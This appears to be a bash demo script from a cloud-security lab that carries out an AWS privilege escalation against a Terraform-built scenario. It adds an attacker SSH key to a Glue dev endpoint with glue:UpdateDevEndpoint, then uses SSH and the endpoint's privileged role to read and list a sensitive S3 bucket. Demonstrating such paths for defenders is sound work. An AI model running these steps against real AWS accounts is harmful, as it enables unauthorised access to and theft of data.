#!/bin/bash

# Demo script for glue:UpdateDevEndpoint privilege escalation
# This scenario demonstrates how a user with glue:UpdateDevEndpoint can add an SSH key
# to an existing Glue dev endpoint and access sensitive S3 buckets


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    echo -e "${DIM}\$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    echo -e "\n${CYAN}\$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-glue-002-to-bucket-starting-user"
TARGET_ROLE="pl-prod-glue-002-to-bucket-target-role"
SSH_KEY_PATH="/tmp/pl-glue-002-demo-key"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Glue UpdateDevEndpoint Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo -e "${YELLOW}⚠️  COST NOTE ⚠️${NC}"
echo -e "${YELLOW}A Glue Development Endpoint (created by Terraform) is already running${NC}"
echo -e "${YELLOW}This endpoint costs approximately \$2.20/hour${NC}"
echo -e "${YELLOW}This demo will add an SSH key to the existing endpoint (no additional cost)${NC}"
echo -e "${YELLOW}The endpoint will continue running after the demo${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_glue_002_glue_updatedevendpoint.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

# Get endpoint name from Terraform outputs
ENDPOINT_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.dev_endpoint_name')

if [ "$ENDPOINT_NAME" == "null" ] || [ -z "$ENDPOINT_NAME" ]; then
    echo -e "${RED}Error: Could not retrieve endpoint name from terraform output${NC}"
    exit 1
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo "Target endpoint: $ENDPOINT_NAME"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd aws sts get-caller-identity --query 'Arn' --output text
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
show_cmd aws sts get-caller-identity --query 'Account' --output text
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have bucket access yet
echo -e "${YELLOW}Step 4: Verifying we don't have bucket access yet${NC}"

# Extract bucket name from Terraform outputs
BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.sensitive_bucket_name')

if [ "$BUCKET_NAME" == "null" ] || [ -z "$BUCKET_NAME" ]; then
    echo -e "${RED}Error: Could not retrieve bucket name from terraform output${NC}"
    exit 1
fi

echo "Target bucket: $BUCKET_NAME"
echo "Attempting to access bucket: $BUCKET_NAME"
show_cmd aws s3 ls s3://$BUCKET_NAME
if aws s3 ls s3://$BUCKET_NAME &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot access bucket (as expected)${NC}"
fi
echo ""

# Step 5: Inspect the existing Glue dev endpoint
echo -e "${YELLOW}Step 5: Inspecting the existing Glue dev endpoint${NC}"
echo "Endpoint name: $ENDPOINT_NAME"
echo ""

show_cmd aws glue get-dev-endpoint --endpoint-name $ENDPOINT_NAME --region $AWS_REGION --output json
ENDPOINT_DETAILS=$(aws glue get-dev-endpoint \
    --endpoint-name $ENDPOINT_NAME \
    --region $AWS_REGION \
    --output json 2>/dev/null)

ENDPOINT_STATUS=$(echo "$ENDPOINT_DETAILS" | jq -r '.DevEndpoint.Status')
ENDPOINT_ROLE=$(echo "$ENDPOINT_DETAILS" | jq -r '.DevEndpoint.RoleArn')
ENDPOINT_PUBLIC_KEYS=$(echo "$ENDPOINT_DETAILS" | jq -r '.DevEndpoint.PublicKeys // [] | length')

echo "Endpoint status: $ENDPOINT_STATUS"
echo "Endpoint role: $ENDPOINT_ROLE"
echo "Current public keys: $ENDPOINT_PUBLIC_KEYS"
echo ""

if [ "$ENDPOINT_STATUS" != "READY" ]; then
    echo -e "${YELLOW}Warning: Endpoint is not in READY state${NC}"
    echo "Current state: $ENDPOINT_STATUS"
    echo "This may be because it's still initializing (takes ~5-10 minutes after Terraform apply)"
    echo ""
    echo "Waiting for endpoint to become READY..."

    MAX_WAIT=900  # 15 minutes
    WAIT_TIME=0

    while [ $WAIT_TIME -lt $MAX_WAIT ]; do
        ENDPOINT_STATUS=$(aws glue get-dev-endpoint \
            --endpoint-name $ENDPOINT_NAME \
            --region $AWS_REGION \
            --query 'DevEndpoint.Status' \
            --output text 2>/dev/null || echo "UNKNOWN")

        if [ "$ENDPOINT_STATUS" = "READY" ]; then
            echo -e "\n${GREEN}✓ Endpoint is now ready!${NC}\n"
            break
        elif [ "$ENDPOINT_STATUS" = "FAILED" ]; then
            echo -e "\n${RED}Error: Endpoint is in FAILED state${NC}"
            exit 1
        fi

        echo -n "."
        sleep 10
        WAIT_TIME=$((WAIT_TIME + 10))
    done

    if [ $WAIT_TIME -ge $MAX_WAIT ]; then
        echo -e "\n${RED}Error: Endpoint did not become ready within timeout${NC}"
        exit 1
    fi
fi

echo -e "${GREEN}✓ Endpoint is ready and attached to privileged role${NC}\n"

# Step 6: Generate SSH key pair
echo -e "${YELLOW}Step 6: Generating SSH key pair for endpoint access${NC}"
echo "Key path: $SSH_KEY_PATH"

# Remove any existing key
rm -f ${SSH_KEY_PATH} ${SSH_KEY_PATH}.pub

# Generate new SSH key pair (no passphrase)
ssh-keygen -t rsa -b 2048 -f ${SSH_KEY_PATH} -N "" -C "pl-glue-002-demo" > /dev/null 2>&1

if [ ! -f ${SSH_KEY_PATH}.pub ]; then
    echo -e "${RED}Error: Failed to generate SSH key pair${NC}"
    exit 1
fi

SSH_PUBLIC_KEY=$(cat ${SSH_KEY_PATH}.pub)
echo "SSH public key generated"
echo -e "${GREEN}✓ SSH key pair generated${NC}\n"

# Step 7: Update dev endpoint to add our SSH public key
echo -e "${YELLOW}Step 7: Adding SSH public key to existing dev endpoint${NC}"
echo "This is the privilege escalation vector - adding our SSH key to the endpoint..."
echo ""

show_attack_cmd aws glue update-dev-endpoint --endpoint-name $ENDPOINT_NAME --region $AWS_REGION --add-public-keys "$SSH_PUBLIC_KEY" --output json
aws glue update-dev-endpoint \
    --endpoint-name $ENDPOINT_NAME \
    --region $AWS_REGION \
    --add-public-keys "$SSH_PUBLIC_KEY" \
    --output json > /dev/null

echo -e "${GREEN}✓ Successfully updated dev endpoint with our SSH key${NC}\n"

# Step 8: Wait for update to propagate
echo -e "${YELLOW}Step 8: Waiting for endpoint update to propagate${NC}"
echo "Waiting 15 seconds for SSH key to be activated..."
sleep 15
echo -e "${GREEN}✓ Update should now be active${NC}\n"

# Step 9: Get endpoint SSH address
echo -e "${YELLOW}Step 9: Retrieving endpoint connection details${NC}"
show_cmd aws glue get-dev-endpoint --endpoint-name $ENDPOINT_NAME --region $AWS_REGION --query 'DevEndpoint.PublicAddress' --output text
ENDPOINT_ADDRESS=$(aws glue get-dev-endpoint \
    --endpoint-name $ENDPOINT_NAME \
    --region $AWS_REGION \
    --query 'DevEndpoint.PublicAddress' \
    --output text)

if [ -z "$ENDPOINT_ADDRESS" ] || [ "$ENDPOINT_ADDRESS" = "None" ]; then
    echo -e "${RED}Error: Could not get endpoint address${NC}"
    exit 1
fi

echo "Endpoint address: $ENDPOINT_ADDRESS"
echo -e "${GREEN}✓ Retrieved endpoint connection details${NC}\n"

# Step 10: Wait a bit more for SSH to be fully available with new key
echo -e "${YELLOW}Step 10: Waiting for SSH service to accept new key${NC}"
echo "Giving the endpoint another 15 seconds to ensure our key is active..."
sleep 15
echo -e "${GREEN}✓ SSH should now be available with our key${NC}\n"

# Step 11: SSH into endpoint and access S3 bucket
echo -e "${YELLOW}Step 11: Connecting to endpoint via SSH and accessing S3 bucket${NC}"
echo "SSH connection: glue@$ENDPOINT_ADDRESS"
echo "Executing command to read sensitive data from S3..."
echo ""

# Set SSH options for non-interactive use
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=10"

# Try SSH connection with retry logic
MAX_SSH_RETRIES=6
SSH_RETRY=0
SSH_SUCCESS=false

while [ $SSH_RETRY -lt $MAX_SSH_RETRIES ]; do
    echo "Attempting SSH connection (attempt $((SSH_RETRY + 1))/$MAX_SSH_RETRIES)..."

    # Execute AWS CLI command on the endpoint to read the sensitive file
    show_attack_cmd aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt -
    SENSITIVE_DATA=$(ssh -i ${SSH_KEY_PATH} $SSH_OPTS glue@$ENDPOINT_ADDRESS \
        "aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt -" 2>/dev/null || echo "")

    if [ -n "$SENSITIVE_DATA" ]; then
        SSH_SUCCESS=true
        break
    fi

    echo "SSH connection not ready yet, waiting 10 seconds..."
    sleep 10
    SSH_RETRY=$((SSH_RETRY + 1))
done

if [ "$SSH_SUCCESS" = false ]; then
    echo -e "${RED}Error: Could not establish SSH connection to endpoint${NC}"
    echo "The endpoint may need more time to initialize SSH service with the new key"
    echo "Endpoint details:"
    aws glue get-dev-endpoint --endpoint-name $ENDPOINT_NAME --region $AWS_REGION
    exit 1
fi

echo -e "${GREEN}✓ Successfully connected via SSH${NC}"
echo ""

# Step 12: Display the sensitive data
echo -e "${YELLOW}Step 12: Verifying bucket access${NC}"
echo "Contents of s3://$BUCKET_NAME/sensitive-data.txt:"
echo ""
echo -e "${BLUE}----------------------------------------${NC}"
echo "$SENSITIVE_DATA"
echo -e "${BLUE}----------------------------------------${NC}"
echo ""
echo -e "${GREEN}✓ Successfully read sensitive data from S3!${NC}"
echo -e "${GREEN}✓ BUCKET ACCESS CONFIRMED${NC}"
echo ""

# Step 13: List bucket contents to show full access
echo -e "${YELLOW}Step 13: Listing bucket contents to demonstrate full access${NC}"
echo "Listing all objects in bucket..."
echo ""

show_attack_cmd aws s3 ls s3://$BUCKET_NAME/
ssh -i ${SSH_KEY_PATH} $SSH_OPTS glue@$ENDPOINT_ADDRESS \
    "aws s3 ls s3://$BUCKET_NAME/"

echo ""
echo -e "${GREEN}✓ Full bucket access confirmed${NC}\n"

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with glue:UpdateDevEndpoint permission)"
echo "2. Discovered existing Glue dev endpoint with privileged role"
echo "3. Generated SSH key pair for endpoint access"
echo "4. Updated dev endpoint to add our SSH public key"
echo "5. Connected to endpoint via SSH"
echo "6. Used role credentials to access sensitive S3 bucket: $BUCKET_NAME"
echo "7. Achieved: Full access to sensitive data"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (glue:UpdateDevEndpoint)"
echo -e "  → Add SSH key to existing endpoint ($ENDPOINT_NAME)"
echo -e "  → SSH Access → Role credentials ($TARGET_ROLE)"
echo -e "  → S3 Bucket Access ($BUCKET_NAME)"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo ""
    echo -e "${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Added SSH public key to endpoint: $ENDPOINT_NAME"
echo "- Local SSH key pair: ${SSH_KEY_PATH} / ${SSH_KEY_PATH}.pub"

echo -e "\n${YELLOW}Note: The Glue dev endpoint continues to run (created by Terraform)${NC}"
echo -e "${YELLOW}Cleanup will remove only the attacker's SSH key, not the endpoint itself${NC}"
echo ""
echo -e "${YELLOW}To clean up attack artifacts:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
